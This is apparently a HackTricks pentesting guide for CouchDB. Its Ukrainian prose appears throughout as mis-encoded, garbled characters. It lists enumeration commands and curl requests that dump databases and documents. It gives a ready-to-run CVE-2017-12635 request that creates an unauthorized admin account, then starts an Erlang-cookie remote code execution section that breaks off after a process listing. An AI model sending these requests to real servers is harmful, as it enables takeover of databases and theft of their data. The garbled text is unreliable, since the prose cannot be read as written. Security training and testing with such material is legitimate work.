# 5984,6984 - Pentesting CouchDB

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **–û—Å–Ω–æ–≤–Ω–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è**

**CouchDB** - —Ü–µ —É–Ω—ñ–≤–µ—Ä—Å–∞–ª—å–Ω–∞ —Ç–∞ –ø–æ—Ç—É–∂–Ω–∞ **–¥–æ–∫—É–º–µ–Ω—Ç–Ω–æ-–æ—Ä—ñ—î–Ω—Ç–æ–≤–∞–Ω–∞ –±–∞–∑–∞ –¥–∞–Ω–∏—Ö**, —è–∫–∞ –æ—Ä–≥–∞–Ω—ñ–∑–æ–≤—É—î –¥–∞–Ω—ñ, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Å—Ç—Ä—É–∫—Ç—É—Ä—É **–∫–ª—é—á-–∑–Ω–∞—á–µ–Ω–Ω—è** –≤ –∫–æ–∂–Ω–æ–º—É **–¥–æ–∫—É–º–µ–Ω—Ç—ñ**. –ü–æ–ª—è –≤ –¥–æ–∫—É–º–µ–Ω—Ç—ñ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω—ñ —è–∫ **–ø–∞—Ä–∏ –∫–ª—é—á/–∑–Ω–∞—á–µ–Ω–Ω—è, —Å–ø–∏—Å–∫–∏ –∞–±–æ –º–∞–ø–∏**, —â–æ –∑–∞–±–µ–∑–ø–µ—á—É—î –≥–Ω—É—á–∫—ñ—Å—Ç—å —É –∑–±–µ—Ä—ñ–≥–∞–Ω–Ω—ñ —Ç–∞ –æ—Ç—Ä–∏–º–∞–Ω–Ω—ñ –¥–∞–Ω–∏—Ö.

–ö–æ–∂–Ω–æ–º—É **–¥–æ–∫—É–º–µ–Ω—Ç—É**, –∑–±–µ—Ä–µ–∂–µ–Ω–æ–º—É –≤ CouchDB, –ø—Ä–∏—Å–≤–æ—é—î—Ç—å—Å—è **—É–Ω—ñ–∫–∞–ª—å–Ω–∏–π —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä** (`_id`) –Ω–∞ —Ä—ñ–≤–Ω—ñ –¥–æ–∫—É–º–µ–Ω—Ç–∞. –ö—Ä—ñ–º —Ç–æ–≥–æ, –∫–æ–∂–Ω–∞ –∑–º—ñ–Ω–∞, –≤–Ω–µ—Å–µ–Ω–∞ —Ç–∞ –∑–±–µ—Ä–µ–∂–µ–Ω–∞ –≤ –±–∞–∑—ñ –¥–∞–Ω–∏—Ö, –æ—Ç—Ä–∏–º—É—î **–Ω–æ–º–µ—Ä –≤–µ—Ä—Å—ñ—ó** (`_rev`). –¶–µ–π –Ω–æ–º–µ—Ä –≤–µ—Ä—Å—ñ—ó –¥–æ–∑–≤–æ–ª—è—î –µ—Ñ–µ–∫—Ç–∏–≤–Ω–æ **–≤—ñ–¥—Å—Ç–µ–∂—É–≤–∞—Ç–∏ —Ç–∞ –∫–µ—Ä—É–≤–∞—Ç–∏ –∑–º—ñ–Ω–∞–º–∏**, –ø–æ–ª–µ–≥—à—É—é—á–∏ –ª–µ–≥–∫–µ –æ—Ç—Ä–∏–º–∞–Ω–Ω—è —Ç–∞ —Å–∏–Ω—Ö—Ä–æ–Ω—ñ–∑–∞—Ü—ñ—é –¥–∞–Ω–∏—Ö —É –±–∞–∑—ñ –¥–∞–Ω–∏—Ö.

**–ü–æ—Ä—Ç –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º:** 5984(http), 6984(https)
```
PORT      STATE SERVICE REASON
5984/tcp  open  unknown syn-ack
```
## **–ê–≤—Ç–æ–º–∞—Ç–∏—á–Ω–µ –ø–µ—Ä–µ—Ä–∞—Ö—É–≤–∞–Ω–Ω—è**
```bash
nmap -sV --script couchdb-databases,couchdb-stats -p <PORT> <IP>
msf> use auxiliary/scanner/couchdb/couchdb_enum
```
## –†—É—á–Ω–∞ –µ–Ω—É–º–µ—Ä–∞—Ü—ñ—è

### –ë–∞–Ω–µ—Ä
```
curl http://IP:5984/
```
–¶–µ –Ω–∞–¥—Å–∏–ª–∞—î GET-–∑–∞–ø–∏—Ç –¥–æ –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ—ó CouchDB —ñ–Ω—Å—Ç–∞–Ω—Ü—ñ—ó. –í—ñ–¥–ø–æ–≤—ñ–¥—å –ø–æ–≤–∏–Ω–Ω–∞ –≤–∏–≥–ª—è–¥–∞—Ç–∏ –ø—Ä–∏–±–ª–∏–∑–Ω–æ —Ç–∞–∫, —è–∫ –æ–¥–Ω–∞ –∑ –Ω–∞—Å—Ç—É–ø–Ω–∏—Ö:
```bash
{"couchdb":"Welcome","version":"0.10.1"}
{"couchdb":"Welcome","version":"2.0.0","vendor":{"name":"The Apache Software Foundation"}}
```
{% hint style="info" %}
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ —è–∫—â–æ –ø—Ä–∏ –¥–æ—Å—Ç—É–ø—ñ –¥–æ –∫–æ—Ä–µ–Ω—è couchdb –≤–∏ –æ—Ç—Ä–∏–º—É—î—Ç–µ `401 Unauthorized` –∑ —á–∏–º–æ—Å—å –Ω–∞ –∑—Ä–∞–∑–æ–∫ —Ü—å–æ–≥–æ: `{"error":"unauthorized","reason":"Authentication required."}` **–≤–∏ –Ω–µ –∑–º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø** –¥–æ –±–∞–Ω–µ—Ä–∞ –∞–±–æ –±—É–¥—å-—è–∫–æ—ó —ñ–Ω—à–æ—ó –∫—ñ–Ω—Ü–µ–≤–æ—ó —Ç–æ—á–∫–∏.
{% endhint %}

### Info Enumeration

–¶–µ –∫—ñ–Ω—Ü–µ–≤—ñ —Ç–æ—á–∫–∏, –¥–æ —è–∫–∏—Ö –≤–∏ –º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é **GET** –∑–∞–ø–∏—Ç—É —Ç–∞ –≤–∏—Ç—è–≥—Ç–∏ –¥–µ—è–∫—É —Ü—ñ–∫–∞–≤—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é. –í–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ [**–±—ñ–ª—å—à–µ –∫—ñ–Ω—Ü–µ–≤–∏—Ö —Ç–æ—á–æ–∫ —Ç–∞ –±—ñ–ª—å—à –¥–µ—Ç–∞–ª—å–Ω—ñ –æ–ø–∏—Å–∏ –≤ –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü—ñ—ó couchdb**](https://docs.couchdb.org/en/latest/api/index.html).

* **`/_active_tasks`** –°–ø–∏—Å–æ–∫ –∑–∞–ø—É—â–µ–Ω–∏—Ö –∑–∞–≤–¥–∞–Ω—å, –≤–∫–ª—é—á–∞—é—á–∏ —Ç–∏–ø –∑–∞–≤–¥–∞–Ω–Ω—è, –Ω–∞–∑–≤—É, —Å—Ç–∞—Ç—É—Å —Ç–∞ —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä –ø—Ä–æ—Ü–µ—Å—É.
* **`/_all_dbs`** –ü–æ–≤–µ—Ä—Ç–∞—î —Å–ø–∏—Å–æ–∫ —É—Å—ñ—Ö –±–∞–∑ –¥–∞–Ω–∏—Ö —É –µ–∫–∑–µ–º–ø–ª—è—Ä—ñ CouchDB.
* **`/_cluster_setup`** –ü–æ–≤–µ—Ä—Ç–∞—î —Å—Ç–∞—Ç—É—Å –≤—É–∑–ª–∞ –∞–±–æ –∫–ª–∞—Å—Ç–µ—Ä–∞, –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–æ –¥–æ –º–∞–π—Å—Ç—Ä–∞ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è –∫–ª–∞—Å—Ç–µ—Ä–∞.
* **`/_db_updates`** –ü–æ–≤–µ—Ä—Ç–∞—î —Å–ø–∏—Å–æ–∫ —É—Å—ñ—Ö –ø–æ–¥—ñ–π –±–∞–∑–∏ –¥–∞–Ω–∏—Ö —É –µ–∫–∑–µ–º–ø–ª—è—Ä—ñ CouchDB. –Ü—Å–Ω—É–≤–∞–Ω–Ω—è –±–∞–∑–∏ –¥–∞–Ω–∏—Ö `_global_changes` —î –æ–±–æ–≤'—è–∑–∫–æ–≤–∏–º –¥–ª—è –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —Ü—ñ—î—ó –∫—ñ–Ω—Ü–µ–≤–æ—ó —Ç–æ—á–∫–∏.
* **`/_membership`** –í—ñ–¥–æ–±—Ä–∞–∂–∞—î –≤—É–∑–ª–∏, —è–∫—ñ —î —á–∞—Å—Ç–∏–Ω–æ—é –∫–ª–∞—Å—Ç–µ—Ä–∞, —è–∫ `cluster_nodes`. –ü–æ–ª–µ `all_nodes` –≤—ñ–¥–æ–±—Ä–∞–∂–∞—î –≤—Å—ñ –≤—É–∑–ª–∏, –ø—Ä–æ —è–∫—ñ –∑–Ω–∞—î —Ü–µ–π –≤—É–∑–æ–ª, –≤–∫–ª—é—á–∞—é—á–∏ —Ç—ñ, —â–æ —î —á–∞—Å—Ç–∏–Ω–æ—é –∫–ª–∞—Å—Ç–µ—Ä–∞.
* **`/_scheduler/jobs`** –°–ø–∏—Å–æ–∫ –∑–∞–≤–¥–∞–Ω—å —Ä–µ–ø–ª—ñ–∫–∞—Ü—ñ—ó. –û–ø–∏—Å –∫–æ–∂–Ω–æ–≥–æ –∑–∞–≤–¥–∞–Ω–Ω—è –≤–∫–ª—é—á–∞—Ç–∏–º–µ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –ø—Ä–æ –¥–∂–µ—Ä–µ–ª–æ —Ç–∞ —Ü—ñ–ª—å, —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä —Ä–µ–ø–ª—ñ–∫–∞—Ü—ñ—ó, —ñ—Å—Ç–æ—Ä—ñ—é –æ—Å—Ç–∞–Ω–Ω—ñ—Ö –ø–æ–¥—ñ–π —Ç–∞ –∫—ñ–ª—å–∫–∞ —ñ–Ω—à–∏—Ö —Ä–µ—á–µ–π.
* **`/_scheduler/docs`** –°–ø–∏—Å–æ–∫ —Å—Ç–∞–Ω—ñ–≤ –¥–æ–∫—É–º–µ–Ω—Ç—ñ–≤ —Ä–µ–ø–ª—ñ–∫–∞—Ü—ñ—ó. –í–∫–ª—é—á–∞—î —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –ø—Ä–æ –≤—Å—ñ –¥–æ–∫—É–º–µ–Ω—Ç–∏, –Ω–∞–≤—ñ—Ç—å —É —Å—Ç–∞–Ω–∞—Ö `completed` —Ç–∞ `failed`. –î–ª—è –∫–æ–∂–Ω–æ–≥–æ –¥–æ–∫—É–º–µ–Ω—Ç–∞ –ø–æ–≤–µ—Ä—Ç–∞—î —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä –¥–æ–∫—É–º–µ–Ω—Ç–∞, –±–∞–∑—É –¥–∞–Ω–∏—Ö, —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä —Ä–µ–ø–ª—ñ–∫–∞—Ü—ñ—ó, –¥–∂–µ—Ä–µ–ª–æ —Ç–∞ —Ü—ñ–ª—å, –∞ —Ç–∞–∫–æ–∂ —ñ–Ω—à—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é.
* **`/_scheduler/docs/{replicator_db}`**
* **`/_scheduler/docs/{replicator_db}/{docid}`**
* **`/_node/{node-name}`** –ö—ñ–Ω—Ü–µ–≤–∞ —Ç–æ—á–∫–∞ `/_node/{node-name}` –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∞ –¥–ª—è –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è —ñ–º–µ–Ω—ñ –≤—É–∑–ª–∞ Erlang —Å–µ—Ä–≤–µ—Ä–∞, —è–∫–∏–π –æ–±—Ä–æ–±–ª—è—î –∑–∞–ø–∏—Ç. –¶–µ –Ω–∞–π–±—ñ–ª—å—à –∫–æ—Ä–∏—Å–Ω–æ –ø—Ä–∏ –¥–æ—Å—Ç—É–ø—ñ –¥–æ `/_node/_local`, —â–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ —Ü—é —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é.
* **`/_node/{node-name}/_stats`** –†–µ—Å—É—Ä—Å `_stats` –ø–æ–≤–µ—Ä—Ç–∞—î –æ–±'—î–∫—Ç JSON, —â–æ –º—ñ—Å—Ç–∏—Ç—å —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É –¥–ª—è –∑–∞–ø—É—â–µ–Ω–æ–≥–æ —Å–µ—Ä–≤–µ—Ä–∞. –õ—ñ—Ç–µ—Ä–∞–ª—å–Ω–∏–π —Ä—è–¥–æ–∫ `_local` —Å–ª—É–∂–∏—Ç—å –ø—Å–µ–≤–¥–æ–Ω—ñ–º–æ–º –¥–ª—è —ñ–º–µ–Ω—ñ –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ –≤—É–∑–ª–∞, —Ç–æ–º—É –¥–ª—è –≤—Å—ñ—Ö URL —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∏ `{node-name}` –º–æ–∂–µ –±—É—Ç–∏ –∑–∞–º—ñ–Ω–µ–Ω–æ –Ω–∞ `_local`, —â–æ–± –≤–∑–∞—î–º–æ–¥—ñ—è—Ç–∏ –∑—ñ —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–æ—é –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ –≤—É–∑–ª–∞.
* **`/_node/{node-name}/_system`** –†–µ—Å—É—Ä—Å \_system –ø–æ–≤–µ—Ä—Ç–∞—î –æ–±'—î–∫—Ç JSON, —â–æ –º—ñ—Å—Ç–∏—Ç—å —Ä—ñ–∑–Ω—É —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É –Ω–∞ —Ä—ñ–≤–Ω—ñ —Å–∏—Å—Ç–µ–º–∏ –¥–ª—è –∑–∞–ø—É—â–µ–Ω–æ–≥–æ —Å–µ—Ä–≤–µ—Ä–∞\_.\_ –í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ \_\_`_local` —è–∫ {node-name}, —â–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –ø—Ä–æ –ø–æ—Ç–æ—á–Ω–∏–π –≤—É–∑–æ–ª.
* **`/_node/{node-name}/_restart`**
* **`/_up`** –ü—ñ–¥—Ç–≤–µ—Ä–¥–∂—É—î, —â–æ —Å–µ—Ä–≤–µ—Ä –ø—Ä–∞—Ü—é—î, –∑–∞–ø—É—â–µ–Ω–∏–π —ñ –≥–æ—Ç–æ–≤–∏–π –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—Ç–∏ –Ω–∞ –∑–∞–ø–∏—Ç–∏. –Ø–∫—â–æ [`maintenance_mode`](https://docs.couchdb.org/en/latest/config/couchdb.html#couchdb/maintenance\_mode) —î `true` –∞–±–æ `nolb`, –∫—ñ–Ω—Ü–µ–≤–∞ —Ç–æ—á–∫–∞ –ø–æ–≤–µ—Ä–Ω–µ –≤—ñ–¥–ø–æ–≤—ñ–¥—å 404.
* **`/_uuids`** –ó–∞–ø–∏—Ç—É—î –æ–¥–∏–Ω –∞–±–æ –∫—ñ–ª—å–∫–∞ —É–Ω—ñ–≤–µ—Ä—Å–∞–ª—å–Ω–æ —É–Ω—ñ–∫–∞–ª—å–Ω–∏—Ö —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä—ñ–≤ (UUID) –∑ –µ–∫–∑–µ–º–ø–ª—è—Ä–∞ CouchDB.
* **`/_reshard`** –ü–æ–≤–µ—Ä—Ç–∞—î –∫—ñ–ª—å–∫—ñ—Å—Ç—å –∑–∞–≤–µ—Ä—à–µ–Ω–∏—Ö, –Ω–µ–≤–¥–∞–ª–∏—Ö, –∑–∞–ø—É—â–µ–Ω–∏—Ö, –∑—É–ø–∏–Ω–µ–Ω–∏—Ö —Ç–∞ –∑–∞–≥–∞–ª—å–Ω–∏—Ö –∑–∞–≤–¥–∞–Ω—å —Ä–∞–∑–æ–º –∑—ñ —Å—Ç–∞–Ω–æ–º –ø–µ—Ä–µ—Ä–æ–∑–ø–æ–¥—ñ–ª—É –Ω–∞ –∫–ª–∞—Å—Ç–µ—Ä—ñ.

–ë—ñ–ª—å—à —Ü—ñ–∫–∞–≤—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –º–æ–∂–Ω–∞ –≤–∏—Ç—è–≥—Ç–∏, —è–∫ –ø–æ—è—Å–Ω–µ–Ω–æ —Ç—É—Ç: [https://lzone.de/cheat-sheet/CouchDB](https://lzone.de/cheat-sheet/CouchDB)

### **Database List**
```
curl -X GET http://IP:5984/_all_dbs
```
–Ø–∫—â–æ —Ü–µ–π –∑–∞–ø–∏—Ç **–≤—ñ–¥–ø–æ–≤—ñ–¥–∞—î –∑ 401 –Ω–µ–∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–æ**, —Ç–æ–¥—ñ –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω—ñ **–¥—ñ–π—Å–Ω—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ** –¥–ª—è –¥–æ—Å—Ç—É–ø—É –¥–æ –±–∞–∑–∏ –¥–∞–Ω–∏—Ö:
```
curl -X GET http://user:password@IP:5984/_all_dbs
```
–©–æ–± –∑–Ω–∞–π—Ç–∏ –¥—ñ–π—Å–Ω—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ, –≤–∏ –º–æ–≥–ª–∏ –± **—Å–ø—Ä–æ–±—É–≤–∞—Ç–∏** [**–∑–ª–∞–º–∞—Ç–∏ —Å–µ—Ä–≤—ñ—Å**](../generic-methodologies-and-resources/brute-force.md#couchdb).

–¶–µ **–ø—Ä–∏–∫–ª–∞–¥** –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ couchdb, –∫–æ–ª–∏ —É –≤–∞—Å —î **–¥–æ—Å—Ç–∞—Ç–Ω—å–æ –ø—Ä–∏–≤—ñ–ª–µ—ó–≤** –¥–ª—è –ø–µ—Ä–µ–ª—ñ–∫—É –±–∞–∑ –¥–∞–Ω–∏—Ö (–¶–µ –ø—Ä–æ—Å—Ç–æ —Å–ø–∏—Å–æ–∫ –±–∞–∑ –¥–∞–Ω–∏—Ö):
```bash
["_global_changes","_metadata","_replicator","_users","passwords","simpsons"]
```
### Database Info

–í–∏ –º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–µ—è–∫—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –ø—Ä–æ –±–∞–∑—É –¥–∞–Ω–∏—Ö (—Ç–∞–∫—É —è–∫ –∫—ñ–ª—å–∫—ñ—Å—Ç—å —Ñ–∞–π–ª—ñ–≤ —Ç–∞ —ó—Ö —Ä–æ–∑–º—ñ—Ä–∏), –æ—Ç—Ä–∏–º–∞–≤—à–∏ –¥–æ—Å—Ç—É–ø –¥–æ –Ω–∞–∑–≤–∏ –±–∞–∑–∏ –¥–∞–Ω–∏—Ö:
```bash
curl http://IP:5984/<database>
curl http://localhost:5984/simpsons
#Example response:
{"db_name":"simpsons","update_seq":"7-g1AAAAFTeJzLYWBg4MhgTmEQTM4vTc5ISXLIyU9OzMnILy7JAUoxJTIkyf___z8rkQmPoiQFIJlkD1bHjE-dA0hdPFgdAz51CSB19WB1jHjU5bEASYYGIAVUOp8YtQsgavfjtx-i9gBE7X1i1D6AqAX5KwsA2vVvNQ","sizes":{"file":62767,"external":1320,"active":2466},"purge_seq":0,"other":{"data_size":1320},"doc_del_count":0,"doc_count":7,"disk_size":62767,"disk_format_version":6,"data_size":2466,"compact_running":false,"instance_start_time":"0"}
```
### **–°–ø–∏—Å–æ–∫ –¥–æ–∫—É–º–µ–Ω—Ç—ñ–≤**

–ü–µ—Ä–µ—Ä–∞—Ö—É–π—Ç–µ –∫–æ–∂–µ–Ω –∑–∞–ø–∏—Å —É –±–∞–∑—ñ –¥–∞–Ω–∏—Ö
```bash
curl -X GET http://IP:5984/{dbname}/_all_docs
curl http://localhost:5984/simpsons/_all_docs
#Example response:
{"total_rows":7,"offset":0,"rows":[
{"id":"f0042ac3dc4951b51f056467a1000dd9","key":"f0042ac3dc4951b51f056467a1000dd9","value":{"rev":"1-fbdd816a5b0db0f30cf1fc38e1a37329"}},
{"id":"f53679a526a868d44172c83a61000d86","key":"f53679a526a868d44172c83a61000d86","value":{"rev":"1-7b8ec9e1c3e29b2a826e3d14ea122f6e"}},
{"id":"f53679a526a868d44172c83a6100183d","key":"f53679a526a868d44172c83a6100183d","value":{"rev":"1-e522ebc6aca87013a89dd4b37b762bd3"}},
{"id":"f53679a526a868d44172c83a61002980","key":"f53679a526a868d44172c83a61002980","value":{"rev":"1-3bec18e3b8b2c41797ea9d61a01c7cdc"}},
{"id":"f53679a526a868d44172c83a61003068","key":"f53679a526a868d44172c83a61003068","value":{"rev":"1-3d2f7da6bd52442e4598f25cc2e84540"}},
{"id":"f53679a526a868d44172c83a61003a2a","key":"f53679a526a868d44172c83a61003a2a","value":{"rev":"1-4446bfc0826ed3d81c9115e450844fb4"}},
{"id":"f53679a526a868d44172c83a6100451b","key":"f53679a526a868d44172c83a6100451b","value":{"rev":"1-3f6141f3aba11da1d65ff0c13fe6fd39"}}
]}
```
### **–ü—Ä–æ—á–∏—Ç–∞—Ç–∏ –¥–æ–∫—É–º–µ–Ω—Ç**

–ü—Ä–æ—á–∏—Ç–∞–π—Ç–µ –≤–º—ñ—Å—Ç –¥–æ–∫—É–º–µ–Ω—Ç–∞ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –±–∞–∑–∏ –¥–∞–Ω–∏—Ö:
```bash
curl -X GET http://IP:5984/{dbname}/{id}
curl http://localhost:5984/simpsons/f0042ac3dc4951b51f056467a1000dd9
#Example response:
{"_id":"f0042ac3dc4951b51f056467a1000dd9","_rev":"1-fbdd816a5b0db0f30cf1fc38e1a37329","character":"Homer","quote":"Doh!"}
```
## CouchDB –ü—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–µ –ü—ñ–¥–≤–∏—â–µ–Ω–Ω—è [CVE-2017-12635](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2017-12635)

–ó–∞–≤–¥—è–∫–∏ –≤—ñ–¥–º—ñ–Ω–Ω–æ—Å—Ç—è–º –º—ñ–∂ –ø–∞—Ä—Å–µ—Ä–∞–º–∏ JSON Erlang —Ç–∞ JavaScript –≤–∏ –º–æ–∂–µ—Ç–µ **—Å—Ç–≤–æ—Ä–∏—Ç–∏ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞** –∑ –æ–±–ª—ñ–∫–æ–≤–∏–º–∏ –¥–∞–Ω–∏–º–∏ `hacktricks:hacktricks` –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –Ω–∞—Å—Ç—É–ø–Ω–æ–≥–æ –∑–∞–ø–∏—Ç—É:
```bash
curl -X PUT -d '{"type":"user","name":"hacktricks","roles":["_admin"],"roles":[],"password":"hacktricks"}' localhost:5984/_users/org.couchdb.user:hacktricks -H "Content-Type:application/json"
```
[**–ë—ñ–ª—å—à–µ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø—Ä–æ —Ü—é –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å —Ç—É—Ç**](https://justi.cz/security/2017/11/14/couchdb-rce-npm.html).

## CouchDB RCE

### **–û–≥–ª—è–¥ –±–µ–∑–ø–µ–∫–∏ Erlang Cookie**

–ü—Ä–∏–∫–ª–∞–¥ [–∑–≤—ñ–¥—Å–∏](https://0xdf.gitlab.io/2018/09/15/htb-canape.html).

–£ –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü—ñ—ó CouchDB, –∑–æ–∫—Ä–µ–º–∞ –≤ —Ä–æ–∑–¥—ñ–ª—ñ, —â–æ —Å—Ç–æ—Å—É—î—Ç—å—Å—è –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è –∫–ª–∞—Å—Ç–µ—Ä—É ([–ø–æ—Å–∏–ª–∞–Ω–Ω—è](http://docs.couchdb.org/en/stable/cluster/setup.html#cluster-setup)), –æ–±–≥–æ–≤–æ—Ä—é—î—Ç—å—Å—è –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –ø–æ—Ä—Ç—ñ–≤ CouchDB –≤ —Ä–µ–∂–∏–º—ñ –∫–ª–∞—Å—Ç–µ—Ä—É. –ó–∞–∑–Ω–∞—á–∞—î—Ç—å—Å—è, —â–æ, —è–∫ —ñ –≤ –∞–≤—Ç–æ–Ω–æ–º–Ω–æ–º—É —Ä–µ–∂–∏–º—ñ, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –ø–æ—Ä—Ç `5984`. –ö—Ä—ñ–º —Ç–æ–≥–æ, –ø–æ—Ä—Ç `5986` –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–∏–π –¥–ª—è –ª–æ–∫–∞–ª—å–Ω–∏—Ö API –≤—É–∑–ª—ñ–≤, –∞ –≤–∞–∂–ª–∏–≤–æ, —â–æ Erlang –≤–∏–º–∞–≥–∞—î TCP –ø–æ—Ä—Ç `4369` –¥–ª—è –¥–µ–º–æ–Ω–∞ –≤—ñ–¥–æ–±—Ä–∞–∂–µ–Ω–Ω—è –ø–æ—Ä—Ç—ñ–≤ Erlang (EPMD), —â–æ –ø–æ–ª–µ–≥—à—É—î –∑–≤'—è–∑–æ–∫ –º—ñ–∂ –≤—É–∑–ª–∞–º–∏ –≤ –∫–ª–∞—Å—Ç–µ—Ä—ñ Erlang. –¶–µ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è —Ñ–æ—Ä–º—É—î –º–µ—Ä–µ–∂—É, –¥–µ –∫–æ–∂–µ–Ω –≤—É–∑–æ–ª –ø–æ–≤'—è–∑–∞–Ω–∏–π –∑ —É—Å—ñ–º–∞ —ñ–Ω—à–∏–º–∏ –≤—É–∑–ª–∞–º–∏.

–û—Å–æ–±–ª–∏–≤—É —É–≤–∞–≥—É —Å–ª—ñ–¥ –∑–≤–µ—Ä–Ω—É—Ç–∏ –Ω–∞ –±–µ–∑–ø–µ–∫—É –ø–æ—Ä—Ç—É `4369`. –Ø–∫—â–æ —Ü–µ–π –ø–æ—Ä—Ç —Å—Ç–∞—î –¥–æ—Å—Ç—É–ø–Ω–∏–º —á–µ—Ä–µ–∑ –Ü–Ω—Ç–µ—Ä–Ω–µ—Ç –∞–±–æ –±—É–¥—å-—è–∫—É –Ω–µ–Ω–∞–¥—ñ–π–Ω—É –º–µ—Ä–µ–∂—É, –±–µ–∑–ø–µ–∫–∞ —Å–∏—Å—Ç–µ–º–∏ —Å–∏–ª—å–Ω–æ –∑–∞–ª–µ–∂–∏—Ç—å –≤—ñ–¥ —É–Ω—ñ–∫–∞–ª—å–Ω–æ–≥–æ —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä–∞, –≤—ñ–¥–æ–º–æ–≥–æ —è–∫ "cookie". –¶–µ–π cookie –¥—ñ—î —è–∫ –∑–∞—Å—ñ–± –∑–∞—Ö–∏—Å—Ç—É. –ù–∞–ø—Ä–∏–∫–ª–∞–¥, —É –¥–∞–Ω–æ–º—É —Å–ø–∏—Å–∫—É –ø—Ä–æ—Ü–µ—Å—ñ–≤ –º–æ–∂–µ –±—É—Ç–∏ —Å–ø–æ—Å—Ç–µ—Ä–µ–∂–µ–Ω–æ cookie –∑ –Ω–∞–∑–≤–æ—é "monster", —â–æ –≤–∫–∞–∑—É—î –Ω–∞ –π–æ–≥–æ –æ–ø–µ—Ä–∞—Ü—ñ–π–Ω—É —Ä–æ–ª—å —É —Å–∏—Å—Ç–µ–º—ñ –±–µ–∑–ø–µ–∫–∏.
```
www-data@canape:/$ ps aux | grep couchdb
